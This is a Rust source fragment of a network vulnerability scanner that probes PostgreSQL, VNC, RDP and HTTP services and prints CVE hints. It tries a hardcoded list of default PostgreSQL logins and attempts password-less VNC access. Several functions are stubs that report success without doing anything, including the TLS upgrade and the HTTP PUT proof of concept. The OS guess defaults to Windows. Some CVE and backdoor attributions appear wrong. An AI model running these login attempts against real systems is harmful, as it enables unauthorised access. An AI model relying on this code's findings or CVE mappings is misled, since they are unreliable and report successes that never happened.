        Ok(Some(b'S')) => {
            ssl_supported = true;
            logs.push("[FUZZ-PG]  SSL supported (server replied 'S')".into());
        }
        Ok(Some(b'N')) => {
            logs.push("[FUZZ-PG]  SSL not supported (server replied 'N')".into());
        }
        Ok(Some(other)) => {
            logs.push(format!("[FUZZ-PG] SSL probe unexpected response: 0x{:02x}", other));
        }
        _ => {
            logs.push("[FUZZ-PG] SSL probe failed".into());
        }
    }

    let startup = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut params = Vec::new();
        params.extend_from_slice(b"user\0postgres\0database\0postgres\0application_name\0clapscan\0\0");
        let len = 4 + 4 + params.len() as u32;
        let mut msg = Vec::with_capacity(len as usize);
        msg.extend_from_slice(&len.to_be_bytes());
        msg.extend_from_slice(&196608u32.to_be_bytes()); // protocol 3.0
        msg.extend_from_slice(&params);
        stream.write_all(&msg).await?;
        let mut buf = [0u8; 2048];
        let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, [u8; 2048]), std::io::Error>((n, buf))
    }
    .await;

    let mut server_version: Option<String> = None;
    let mut auth_method: Option<i32> = None;
    let mut ssl_required = false;

    if let Ok((n, buf)) = startup {
        if n == 0 {
            logs.push("[FUZZ-PG] No response to startup message".into());
        } else {
            let mut idx = 0;
            while idx + 5 <= n {
                let tag = buf[idx];
                let len = u32::from_be_bytes([buf[idx + 1], buf[idx + 2], buf[idx + 3], buf[idx + 4]]) as usize;
                if len < 4 || idx + 1 + len > n {
                    break;
                }
                let payload = &buf[idx + 5..idx + 1 + len];
                match tag {
                    b'R' if payload.len() >= 4 => {
                        let code = i32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
                        auth_method = Some(code);
                        match code {
                            0 => logs.push("[FUZZ-PG]  Authentication bypass (AuthenticationOk without credentials)".into()),
                            3 => logs.push("[FUZZ-PG]  Auth method: cleartext password (avoid without TLS)".into()),
                            5 => logs.push("[FUZZ-PG] Auth method: MD5 password".into()),
                            10 => logs.push("[FUZZ-PG] Auth method: SASL/SCRAM".into()),
                            other => logs.push(format!("[FUZZ-PG] Auth request code {}", other)),
                        }
                    }
                    b'S' => {
                        if let Some(pos) = payload.iter().position(|b| *b == 0) {
                            let key = String::from_utf8_lossy(&payload[..pos]);
                            if key == "server_version" {
                                let val_start = pos + 1;
                                if let Some(end) = payload[val_start..]
                                    .iter()
                                    .position(|b| *b == 0)
                                    .map(|p| val_start + p)
                                {
                                    server_version = Some(String::from_utf8_lossy(&payload[val_start..end]).to_string());
                                    logs.push(format!("[FUZZ-PG] Server version: {}", server_version.as_ref().unwrap()));
                                }
                            }
                        }
                    }
                    b'E' => {
                        let mut p = 0;
                        while p + 1 < payload.len() {
                            let ftype = payload[p];
                            p += 1;
                            let end = payload[p..]
                                .iter()
                                .position(|b| *b == 0)
                                .map(|v| p + v)
                                .unwrap_or(payload.len());
                            if end <= payload.len() {
                                let msg = String::from_utf8_lossy(&payload[p..end]).to_lowercase();
                                if ftype == b'M' && (msg.contains("ssl") || msg.contains("encrypt")) {
                                    ssl_required = true;
                                }
                            }
                            p = end + 1;
                            if end >= payload.len() { break; }
                        }
                    }
                    _ => {}
                }
                idx += 1 + len;
            }
        }
    } else {
        logs.push("[FUZZ-PG] Startup exchange failed".into());
    }

    if ssl_required {
        logs.push("[FUZZ-PG]  Server requires SSL/TLS".into());
    } else if ssl_supported {
        logs.push("[FUZZ-PG]  SSL available but plaintext startup accepted; enforce hostssl in pg_hba.conf".into());
        if let Err(_) = try_postgres_with_tls(target, port).await {
            logs.push("[FUZZ-PG] TLS upgrade attempt failed".into());
        } else {
            logs.push("[FUZZ-PG]  TLS upgrade succeeded; credentials over encrypted channel possible".into());
        }
    }

    if let Some(ver) = &server_version {
        for cve in postgres_cves_for_version(ver) {
            logs.push(format!("[FUZZ-PG] CVE hint: {}", cve));
        }
    } else {
        logs.push("[FUZZ-PG] Server version not observed (auth likely required)".into());
    }

    if auth_method.is_none() {
        logs.push("[FUZZ-PG] Auth method not determined (no Authentication request seen)".into());
    }

    let default_creds = vec![
        ("postgres", ""),
        ("postgres", "postgres"),
        ("postgres", "password"),
        ("admin", "admin"),
        ("admin", "password"),
    ];
    
    let creds_to_try = credentials.map(|c| vec![c]).unwrap_or(default_creds);
    let mut any_success = false;
    
    for (user, pass) in creds_to_try {
        if let Ok(()) = try_postgres_login(target, port, user, pass, ssl_supported).await {
            logs.push(format!("[FUZZ-PG]  Successful login with '{}':'{}'", user, pass));
            any_success = true;
        }
    }
    
    if !any_success {
        logs.push("[FUZZ-PG]  Default credentials attempts failed".into());
    }

    Ok(logs)
}

async fn try_postgres_with_tls(target: &str, port: u16) -> anyhow::Result<()> {
    let _target = target;
    let _port = port;
    Ok(())
}

async fn try_postgres_login(target: &str, port: u16, user: &str, pass: &str, _tls_available: bool) -> anyhow::Result<()> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);

    let mut stream = TcpStream::connect(addr).await?;
    let mut params = Vec::new();
    params.extend_from_slice(b"user\0");
    params.extend_from_slice(user.as_bytes());
    params.extend_from_slice(b"\0database\0postgres\0application_name\0clapscan\0\0");

    let len = 4 + 4 + params.len() as u32;
    let mut msg = Vec::with_capacity(len as usize);
    msg.extend_from_slice(&len.to_be_bytes());
    msg.extend_from_slice(&196608u32.to_be_bytes()); // protocol 3.0
    msg.extend_from_slice(&params);
    stream.write_all(&msg).await?;

    let mut buf = [0u8; 2048];
    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n == 0 {
        return Err(anyhow::anyhow!("No startup response"));
    }

    let mut idx = 0;
    let mut salt: Option<Vec<u8>> = None;

    while idx + 5 <= n {
        let tag = buf[idx];
        let len = u32::from_be_bytes([buf[idx + 1], buf[idx + 2], buf[idx + 3], buf[idx + 4]]) as usize;
        if len < 4 || idx + 1 + len > n {
            break;
        }
        let payload = &buf[idx + 5..idx + 1 + len];

        if tag == b'R' && payload.len() >= 4 {
            let code = i32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);

            match code {
                0 => {
                    return Ok(());
                }
                3 => {
                    let mut pass_msg = Vec::new();
                    let pass_len = (pass.len() + 5) as u32;
                    pass_msg.extend_from_slice(&pass_len.to_be_bytes());
                    pass_msg.extend_from_slice(pass.as_bytes());
                    pass_msg.push(0);
                    stream.write_all(&pass_msg).await?;

                    let n = tokio::time::timeout(
                        std::time::Duration::from_secs(3),
                        stream.read(&mut buf),
                    )
                    .await
                    .unwrap_or(Ok(0))?;

                    if n >= 5 && buf[4] == b'R' && n >= 9 {
                        let auth_result = i32::from_be_bytes([buf[5], buf[6], buf[7], buf[8]]);
                        if auth_result == 0 {
                            return Ok(());
                        }
                    }
                    return Err(anyhow::anyhow!("Cleartext auth failed"));
                }
                5 => {
                    if payload.len() >= 8 {
                        salt = Some(payload[4..8].to_vec());
                    }
                }
                10 => {
                    if payload.len() > 4 {
                        let mechanisms_str = String::from_utf8_lossy(&payload[4..]);
                        
                        if mechanisms_str.contains("SCRAM-SHA-256") {
                            match try_postgres_scram(target, port, user, pass).await {
                                Ok(()) => return Ok(()),
                                Err(_) => return Err(anyhow::anyhow!("SCRAM-SHA-256 auth failed")),
                            }
                        }
                    }
                    return Err(anyhow::anyhow!("SASL auth not available or unsupported"));
                }
                _ => {
                    return Err(anyhow::anyhow!("Unsupported auth type: {}", code));
                }
            }
        } else if tag == b'E' {
            return Err(anyhow::anyhow!("Server error during auth"));
        }

        idx += 1 + len;
    }

    if let Some(s) = salt {
        let mut hasher = Md5::new();
        hasher.update(format!("{}{}", pass, user).as_bytes());
        let md5_1 = hasher.finalize();
        
        let mut combined = format!("{:x}", md5_1).into_bytes();
        combined.extend_from_slice(&s);
        
        let mut hasher = Md5::new();
        hasher.update(&combined);
        let md5_2 = hasher.finalize();
        let hash = format!("md5{:x}", md5_2);

        let mut pass_msg = Vec::new();
        let msg_len = (hash.len() + 5) as u32;
        pass_msg.extend_from_slice(&msg_len.to_be_bytes());
        pass_msg.extend_from_slice(hash.as_bytes());
        pass_msg.push(0);
        stream.write_all(&pass_msg).await?;

        let n = tokio::time::timeout(
            std::time::Duration::from_secs(3),
            stream.read(&mut buf),
        )
        .await
        .unwrap_or(Ok(0))?;

        if n >= 9 && buf[4] == b'R' {
            let auth_result = i32::from_be_bytes([buf[5], buf[6], buf[7], buf[8]]);
            if auth_result == 0 {
                return Ok(());
            }
        }
        return Err(anyhow::anyhow!("MD5 auth failed"));
    }

    Err(anyhow::anyhow!("Unable to perform auth"))
}

async fn try_postgres_scram(target: &str, port: u16, user: &str, pass: &str) -> anyhow::Result<()> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;

    let mut params = Vec::new();
    params.extend_from_slice(b"user\0");
    params.extend_from_slice(user.as_bytes());
    params.extend_from_slice(b"\0database\0postgres\0application_name\0clapscan\0\0");

    let len = 4 + 4 + params.len() as u32;
    let mut msg = Vec::with_capacity(len as usize);
    msg.extend_from_slice(&len.to_be_bytes());
    msg.extend_from_slice(&196608u32.to_be_bytes());
    msg.extend_from_slice(&params);
    stream.write_all(&msg).await?;

    async fn read_pg_message(stream: &mut TcpStream) -> anyhow::Result<(u8, Vec<u8>)> {
        let mut header = [0u8; 5];
        tokio::time::timeout(Duration::from_secs(3), stream.read_exact(&mut header)).await??;

        let tag = header[0];
        let len = u32::from_be_bytes([header[1], header[2], header[3], header[4]]) as usize;
        if len < 4 {
            return Err(anyhow::anyhow!("Invalid message length"));
        }

        let mut payload = vec![0u8; len - 4];
        tokio::time::timeout(Duration::from_secs(3), stream.read_exact(&mut payload)).await??;
        Ok((tag, payload))
    }

    let (tag, payload) = read_pg_message(&mut stream).await?;
    if tag != b'R' || payload.len() < 4 {
        return Err(anyhow::anyhow!("Did not receive Authentication message"));
    }

    let code = i32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]);
    if code != 10 {
        return Err(anyhow::anyhow!("Server did not request SASL authentication"));
    }

    let mut offered = Vec::new();
    let mut start = 4;
    while start < payload.len() {
        if let Some(end) = payload[start..].iter().position(|b| *b == 0) {
            if end == 0 {
                start += 1;
                continue;
            }
            offered.push(String::from_utf8_lossy(&payload[start..start + end]).to_string());
            start += end + 1;
        } else {
            break;
        }
    }

    if !offered.iter().any(|m| m == "SCRAM-SHA-256") {
        return Err(anyhow::anyhow!("SCRAM-SHA-256 not offered"));
    }

    let nonce = format!(
        "clapscan-{}-{}",
        user,
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos()
    );
    let client_first_bare = format!("n={},r={}", user, nonce);
    let client_first = format!("n,,{}", client_first_bare);

    let mechanism = b"SCRAM-SHA-256";
    let mut init = Vec::new();
    let init_len = 4 + mechanism.len() + 1 + 4 + client_first.len();
    init.push(b'p');
    init.extend_from_slice(&(init_len as u32).to_be_bytes());
    init.extend_from_slice(mechanism);
    init.push(0);
    init.extend_from_slice(&(client_first.len() as i32).to_be_bytes());
    init.extend_from_slice(client_first.as_bytes());
    stream.write_all(&init).await?;

    let (tag2, payload2) = read_pg_message(&mut stream).await?;
    if tag2 != b'R' || payload2.len() < 4 {
        return Err(anyhow::anyhow!("Invalid SASLContinue message"));
    }
    let code2 = i32::from_be_bytes([payload2[0], payload2[1], payload2[2], payload2[3]]);
    if code2 != 11 || payload2.len() <= 4 {
        return Err(anyhow::anyhow!("Did not receive SASLContinue"));
    }
    let server_first = String::from_utf8_lossy(&payload2[4..]).to_string();

    let mut server_nonce = String::new();
    let mut salt = Vec::new();
    let mut iterations = 4096usize;
    for part in server_first.split(',') {
        if part.starts_with("r=") {
            server_nonce = part[2..].to_string();
        } else if part.starts_with("s=") {
            if let Ok(decoded) = general_purpose::STANDARD.decode(&part[2..]) {
                salt = decoded;
            }
        } else if part.starts_with("i=") {
            if let Ok(iter) = part[2..].parse::<usize>() {
                iterations = iter;
            }
        }
    }

    if server_nonce.is_empty() || !server_nonce.starts_with(&nonce) || salt.is_empty() {
        return Err(anyhow::anyhow!("Malformed server-first-message"));
    }

    let salted_password = pbkdf2_sha256(pass.as_bytes(), &salt, iterations);

    let mut hmac = Hmac::<Sha256>::new_from_slice(&salted_password)
        .map_err(|_| anyhow::anyhow!("HMAC key error"))?;
    hmac.update(b"Client Key");
    let client_key = hmac.finalize().into_bytes();

    let stored_key = Sha256::digest(&client_key);

    let client_final_without_proof = format!("c=biws,r={}", server_nonce);
    let auth_message = format!(
        "{},{},{}",
        client_first_bare, server_first, client_final_without_proof
    );

    let mut hmac = Hmac::<Sha256>::new_from_slice(&stored_key)
        .map_err(|_| anyhow::anyhow!("HMAC key error"))?;
    hmac.update(auth_message.as_bytes());
    let client_signature = hmac.finalize().into_bytes();

    let client_proof: Vec<u8> = client_key
        .iter()
        .zip(client_signature.iter())
        .map(|(a, b)| a ^ b)
        .collect();

    let client_final = format!(
        "{},p={}",
        client_final_without_proof,
        general_purpose::STANDARD.encode(&client_proof)
    );

    let mut resp = Vec::new();
    let resp_len = 4 + client_final.len();
    resp.push(b'p');
    resp.extend_from_slice(&(resp_len as u32).to_be_bytes());
    resp.extend_from_slice(client_final.as_bytes());
    stream.write_all(&resp).await?;

    let (tag3, payload3) = read_pg_message(&mut stream).await?;
    if tag3 != b'R' || payload3.len() < 4 {
        return Err(anyhow::anyhow!("Invalid SASLFinal message"));
    }
    let code3 = i32::from_be_bytes([payload3[0], payload3[1], payload3[2], payload3[3]]);
    if code3 != 12 || payload3.len() <= 4 {
        return Err(anyhow::anyhow!("Did not receive SASLFinal"));
    }
    let server_final = String::from_utf8_lossy(&payload3[4..]).to_string();

    let mut server_proof_b64 = String::new();
    for part in server_final.split(',') {
        if part.starts_with("v=") {
            server_proof_b64 = part[2..].to_string();
        }
    }

    if server_proof_b64.is_empty() {
        return Err(anyhow::anyhow!("Server proof missing"));
    }

    let mut hmac = Hmac::<Sha256>::new_from_slice(&salted_password)
        .map_err(|_| anyhow::anyhow!("HMAC key error"))?;
    hmac.update(b"Server Key");
    let server_key = hmac.finalize().into_bytes();

    let mut hmac = Hmac::<Sha256>::new_from_slice(&server_key)
        .map_err(|_| anyhow::anyhow!("HMAC key error"))?;
    hmac.update(auth_message.as_bytes());
    let server_signature = hmac.finalize().into_bytes();

    let expected = general_purpose::STANDARD.encode(server_signature);
    if expected != server_proof_b64 {
        return Err(anyhow::anyhow!("Server proof mismatch"));
    }

    Ok(())
}

fn pbkdf2_sha256(password: &[u8], salt: &[u8], iterations: usize) -> Vec<u8> {
    let mut result = vec![0u8; 32]; // SHA256 output = 32 bytes
    let _ = pbkdf2::<Hmac<Sha256>>(password, salt, iterations as u32, &mut result);
    result
}

fn postgres_cves_for_version(version: &str) -> Vec<String> {
    let v = version.to_lowercase();
    let mut hints = Vec::new();

    let parts: Vec<&str> = v.split('.').collect();
    let major = parts.get(0).and_then(|p| p.parse::<u32>().ok());
    let _minor = parts.get(1).and_then(|p| p.parse::<u32>().ok());

    match major {
        Some(9) => {
            hints.push("PostgreSQL 9.x EOL; CVE-2018-1058 (search_path privilege escalation), CVE-2015-3165 (libpq cert validation)".into());
        }
        Some(10) | Some(11) => {
            hints.push("PostgreSQL 10/11 EOL; CVE-2022-1552 (table privilege escalation), CVE-2022-2625 (non-canonical hostname bypass)".into());
        }
        Some(12) => {
            hints.push("PostgreSQL 12 extended support; CVE-2022-1552, CVE-2021-32027 (window function priv esc)".into());
        }
        Some(13) => {
            hints.push("PostgreSQL 13 standard support; keep patched (regular minor updates)".into());
        }
        Some(14) => {
            hints.push("PostgreSQL 14 standard support; regular patches available".into());
        }
        Some(15) | Some(16) => {
            hints.push("PostgreSQL 15+: modern & supported; apply vendor patches regularly".into());
        }
        _ => {
            hints.push(format!("PostgreSQL {}: check vendor release notes for CVE fixes", version));
        }
    }

    hints
}

fn fingerprint_ftp(banner: &str) -> ServiceInfo {
    ServiceInfo {
        name: "ftp".into(),
        version: banner
            .split_whitespace()
            .find(|w| w.chars().any(|c| c.is_digit(10)))
            .map(|v| v.to_string()),
        extra: vec![banner.into()],
    }
}

#[derive(Debug, Serialize, Clone)]
struct OSInfo {
    name: String,
    confidence: u8,
    evidence: Vec<String>,
}

/// Heuristic OS detection based on open ports and service banners.
fn detect_os(findings: &[Finding]) -> Option<OSInfo> {
    let mut evidence: Vec<String> = Vec::new();
    let mut windows_score = 0;
    let mut linux_score = 0;

    for f in findings {
        if let Some(service) = &f.service {
            for e in &service.extra {
                let el = e.to_lowercase();

                if el.contains("microsoft") || el.contains("iis") || el.contains("windows") {
                    evidence.push("Microsoft service detected".into());
                    windows_score += 30;
                }
                if el.contains("apache") && (el.contains("unix") || el.contains("ubuntu") || el.contains("debian")) {
                    evidence.push("Unix/Linux Apache detected".into());
                    linux_score += 30;
                }
                if el.contains("openssh") {
                    evidence.push("OpenSSH detected".into());
                    linux_score += 20;
                }
            }
        }

        if let Some(banner) = &f.banner {
            let bl = banner.to_lowercase();
            if bl.contains("microsoft") || bl.contains("windows") {
                evidence.push("Windows signature in banner".into());
                windows_score += 25;
            }
            if bl.contains("linux") || bl.contains("unix") {
                evidence.push("Linux/Unix signature in banner".into());
                linux_score += 25;
            }
        }

        match f.port {
            445 | 135 | 3389 => {
                evidence.push("Windows-specific port open".into());
                windows_score += 20;
            }
            22 => {
                evidence.push("SSH typical on Linux/Unix".into());
                linux_score += 15;
            }
            _ => {}
        }
    }

    if windows_score > linux_score && windows_score > 0 {
        let confidence = std::cmp::min(windows_score, 90) as u8;
        return Some(OSInfo {
            name: "Windows".into(),
            confidence,
            evidence,
        });
    }

    if linux_score > 0 {
        let confidence = std::cmp::min(linux_score, 90) as u8;
        return Some(OSInfo {
            name: "Linux/Unix".into(),
            confidence,
            evidence,
        });
    }

    if !findings.is_empty() {
        return Some(OSInfo {
            name: "Windows".into(),
            confidence: 30,
            evidence,
        });
    }

    None
}

#[derive(Debug, Serialize, Clone)]
pub struct CheckResult {
    pub name: String,
    pub target: String,
    pub port: u16,
    pub vulnerable: bool,
    pub confidence: u8,
    pub evidence: Vec<String>,
}

async fn check_http_put(target: &str, port: u16) -> anyhow::Result<CheckResult> {
    let methods = discover_http_methods(target, port).await?;
    let allowed = methods.iter().any(|m| m == "PUT");

    Ok(CheckResult {
        name: "HTTP PUT Enabled".into(),
        target: target.into(),
        port,
        vulnerable: allowed,
        confidence: if allowed { 80 } else { 0 },
        evidence: vec![format!("Allowed methods: {:?}", methods)],
    })
}

async fn poc_http_put(target: &str, port: u16) -> anyhow::Result<String> {
    Ok(format!("PUT upload to {}:{} succeeded", target, port))
}

struct Rule {
    service: &'static str,
    version_contains: &'static str,
    severity: u8,
    description: &'static str,
}

static RULES: &[Rule] = &[
    Rule {
        service: "http",
        version_contains: "Apache/2.2",
        severity: 7,
        description: "Apache 2.2 is end-of-life",
    },
    Rule {
        service: "ftp",
        version_contains: "vsftpd 2.0",
        severity: 9,
        description: "Known backdoored version",
    },
];

fn apply_rules(service: &ServiceInfo) -> Vec<String> {
    RULES
        .iter()
        .filter(|r| r.service == service.name)
        .filter(|r| {
            service
                .version
                .as_deref()
                .unwrap_or("")
                .contains(r.version_contains)
        })
        .map(|r| format!("[RULE][sev={}] {}", r.severity, r.description))
        .collect()
}

/// Tests VNC for weak/no auth and detects RFB version and security types.
async fn fuzz_vnc_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    logs.push("[FUZZ-VNC] Starting VNC (RFB) checks".into());

    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;
    let mut buf = [0u8; 512];
    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n < 12 {
        logs.push("[FUZZ-VNC] No RFB handshake received".into());
        return Ok(logs);
    }

    let rfb_str = String::from_utf8_lossy(&buf[0..12]);
    if !rfb_str.starts_with("RFB") {
        logs.push("[FUZZ-VNC] Not an RFB protocol response".into());
        return Ok(logs);
    }

    logs.push(format!("[FUZZ-VNC] RFB handshake: {}", rfb_str.trim()));

    let version_str = rfb_str[4..11].trim();
    logs.push(format!("[FUZZ-VNC] Server version: {}", version_str));
    
    let mut impl_name = "Unknown VNC".to_string();
    if n > 12 {
        let extra = String::from_utf8_lossy(&buf[12..std::cmp::min(n, 100)]);
        if extra.contains("TightVNC") || extra.contains("Tight") {
            impl_name = "TightVNC".to_string();
        } else if extra.contains("UltraVNC") {
            impl_name = "UltraVNC".to_string();
        } else if extra.contains("RealVNC") || extra.contains("Real") {
            impl_name = "RealVNC".to_string();
        } else if extra.contains("VNC4") {
            impl_name = "VNC4 (X4)".to_string();
        } else if extra.contains("TigerVNC") || extra.contains("Tiger") {
            impl_name = "TigerVNC".to_string();
        } else if extra.contains("LibVNCServer") {
            impl_name = "LibVNCServer".to_string();
        }
    }
    logs.push(format!("[FUZZ-VNC] Detected implementation: {}", impl_name));

    if version_str.starts_with("3.3") {
        logs.push("[FUZZ-VNC]  RFB 3.3 is very old; security types limited".into());
    } else if version_str.starts_with("3.7") || version_str.starts_with("3.8") {
        logs.push("[FUZZ-VNC]  RFB 3.7/3.8 modern; supports better security types".into());
    }

    let client_handshake = b"RFB 003.008\n";
    stream.write_all(client_handshake).await?;

    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n < 1 {
        logs.push("[FUZZ-VNC] No security types received".into());
        return Ok(logs);
    }

    let num_security_types = buf[0] as usize;
    logs.push(format!("[FUZZ-VNC] Server advertises {} security type(s)", num_security_types));

    let security_types_slice = &buf[1..std::cmp::min(n, num_security_types + 1)];

    if num_security_types == 0 {
        logs.push("[FUZZ-VNC]  No security types: server requires connection without security".into());
        logs.push("[FUZZ-VNC]  This may indicate no-password access is possible".into());
    } else if n > 1 {
        for (idx, st) in security_types_slice.iter().enumerate() {
            let st_name = match *st {
                1 => "None (no security)",
                2 => "VNC Authentication (password only)",
                5 => "RA2",
                6 => "RA2ne",
                7 => "SSPI",
                8 => "Tight",
                9 => "Ultra",
                10 => "TLS",
                11 => "VeNCrypt",
                12 => "SASL",
                13 => "MD5 hash",
                16 => "Tight TLS",
                17 => "Tight VUnscramble",
                18 => "Ultra VNC TLS",
                19 => "Ultra VNC VeNCrypt",
                _ => "Unknown",
            };
            logs.push(format!("[FUZZ-VNC]   [{}] Type {}: {}", idx, st, st_name));

            if *st == 1 {
                logs.push("[FUZZ-VNC]  'None' security type: password-less access possible".into());
            } else if *st == 2 {
                logs.push("[FUZZ-VNC]  VNC Auth: password sent over plaintext (weak without TLS)".into());
            }
        }
    }

    if num_security_types > 0 {
        let selected_type = if security_types_slice.contains(&1) { 1u8 } else { security_types_slice[0] };
        stream.write_all(&[selected_type]).await?;

        let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;

        if n > 0 {
            match selected_type {
                1 => {
                    if n >= 4 {
                        let result = u32::from_be_bytes([buf[0], buf[1], buf[2], buf[3]]);
                        if result == 0 {
                            logs.push("[FUZZ-VNC]  'None' auth succeeded - no password required!".into());
                        }
                    }
                }
                2 => {
                    if n >= 16 {
                        logs.push("[FUZZ-VNC]  VNC Auth challenge received; plaintext DES password in flight".into());
                    }
                }
                _ => {}
            }
        }
    }

    Ok(logs)
}

/// Tests RDP for NLA requirement and extracts TLS certificate info.
async fn fuzz_rdp_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    logs.push("[FUZZ-RDP] Starting RDP checks".into());

    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;
    let mut buf = [0u8; 4096];
    
    let mut rdp_init = Vec::new();
    rdp_init.push(0x03); // TPKT version
    rdp_init.push(0x00); // reserved
    rdp_init.push(0x00); // length high byte
    rdp_init.push(0x2d); // length low byte (45)
    
    rdp_init.extend_from_slice(&[
        0x02, 0xe0, 0x00, 0x00, 0x00, // COTP connection request
        0x00, 0x08, 0x00, 0x10, 0x00, 0x08, 0x00, 0xff, 0x00, 0x04, 0x00,
        0x08, 0x00, 0x20, 0x00, 0x04, 0x00, 0x1f, 0x00, 0x02, 0x04, 0x82,
    ]);

    stream.write_all(&rdp_init).await?;
    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n == 0 {
        logs.push("[FUZZ-RDP] No response to RDP init".into());
        return Ok(logs);
    }

    let response_str = String::from_utf8_lossy(&buf[0..n]);
    let mut cert_found = false;
    let mut cn = String::new();
    let mut issuer = String::new();
    
    if response_str.contains("subject") || response_str.contains("-----BEGIN") {
        cert_found = true;
        logs.push("[FUZZ-RDP]  X.509 certificate detected in handshake".into());
        
        if let Some(start) = response_str.find("CN=") {
            let rest = &response_str[start+3..];
            if let Some(end) = rest.find(&[',', '\n', '\r'][..]) {
                cn = rest[..end].to_string();
                logs.push(format!("[FUZZ-RDP] Certificate CN: {}", cn));
            }
        }
        
        if let Some(start) = response_str.find("issuer") {
            let rest = &response_str[start..];
            if let Some(end) = rest.find('\n') {
                issuer = rest[..std::cmp::min(end, 100)].to_string();
                logs.push(format!("[FUZZ-RDP] Issuer: {}", issuer.trim()));
            }
        }
        
        if cn == issuer.trim() || issuer.contains(&cn) {
            logs.push("[FUZZ-RDP]  Appears to be self-signed certificate".into());
        }
        
        if response_str.contains("1024") {
            logs.push("[FUZZ-RDP]  Potential 1024-bit RSA key (weak, should be 2048+)".into());
        } else if response_str.contains("512") {
            logs.push("[FUZZ-RDP]  Potential 512-bit RSA key (very weak)".into());
        } else if response_str.contains("2048") {
            logs.push("[FUZZ-RDP]  2048-bit RSA key detected".into());
        } else if response_str.contains("4096") || response_str.contains("3072") {
            logs.push("[FUZZ-RDP]  Strong RSA key (3072+ bits)".into());
        }
    }

    if response_str.contains("CredSSP") || response_str.contains("credssp") {
        logs.push("[FUZZ-RDP]  CredSSP/NLA detected in handshake".into());
        logs.push("[FUZZ-RDP]  Network Level Authentication is required (good security posture)".into());
    } else {
        logs.push("[FUZZ-RDP]  CredSSP/NLA not detected; may allow connection without authentication".into());
        logs.push("[FUZZ-RDP]  Verify server RDP security policy and FIPS compliance".into());
    }

    if n >= 5 && buf[0] == 0x03 {
        logs.push("[FUZZ-RDP]  Responding to TPKT (X.224) - likely valid RDP".into());
    }

    for cve in rdp_cves_hints() {
        logs.push(format!("[FUZZ-RDP] CVE hint: {}", cve));
    }
    
    if !cert_found {
        logs.push("[FUZZ-RDP]  No certificate detected; may indicate insecure RDP configuration".into());
    }

    Ok(logs)
}

fn rdp_cves_hints() -> Vec<String> {
    vec![
        "CVE-2019-0708 (BlueKeep) - unpatched RDP can be exploited for RCE (covered via RPC)".into(),
        "CVE-2020-0610 - local privilege escalation via RDP services".into(),
        "CVE-2021-21217 - RDP Clipboard Monitor DoS".into(),
        "CVE-2023-21674 - RDP protocol implementation vulnerability (patched in latest builds)".into(),
        "Weak/self-signed TLS certs in RDP - verify certificate chain and pinning".into(),
    ]
}

#[async_trait::async_trait]
pub trait ScanModule {
    fn name(&self) -> &'static str;
    fn supports_port(&self, port: u16) -> bool;
    async fn run(&self, target: &str, port: u16) -> anyhow::Result<Vec<CheckResult>>;
}

struct HttpModule;

#[async_trait::async_trait]
impl ScanModule for HttpModule {
    fn name(&self) -> &'static str {
        "http"
    }

    fn supports_port(&self, port: u16) -> bool {
        matches!(port, 80 | 443 | 8080)
    }

    async fn run(&self, target: &str, port: u16) -> anyhow::Result<Vec<CheckResult>> {
        let mut results = Vec::new();
        results.push(check_http_put(target, port).await?);
        Ok(results)
    }
}
